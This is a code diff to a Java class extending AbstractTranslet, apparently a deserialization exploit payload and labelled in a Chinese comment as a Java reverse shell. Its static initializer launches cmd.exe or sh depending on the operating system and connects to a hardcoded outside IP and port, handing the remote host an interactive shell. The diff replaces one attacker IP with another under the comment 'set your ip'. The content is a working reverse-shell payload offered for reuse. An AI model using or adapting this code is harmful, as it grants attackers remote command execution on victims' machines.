@@ -11,12 +11,19 @@ import java.net.Socket;
 
 // Java反弹shell：https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0
 public class MyClassLoader2_3 extends AbstractTranslet {
+    public static final String UNIX_SHELL = "sh";
+    public static final String WINDOWS_SHELL = "cmd.exe";
     static {
         try{
-            String host="49.232.174.29";
-            int port=8866;
-            String cmd="cmd.exe";
-//            String cmd="/bin/sh";
+            String host = "8.140.186.0"; // set your ip
+            int port = 55555; //set any port you like
+            String os = System.getProperty("os.name").toLowerCase();
+	    String cmd;
+	    if (os.startsWith("win")) {
+	    	cmd= WINDOWS_SHELL;
+	    } else {
+	    	cmd= UNIX_SHELL;
+	    }
             Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
             Socket s=new Socket(host,port);
             InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
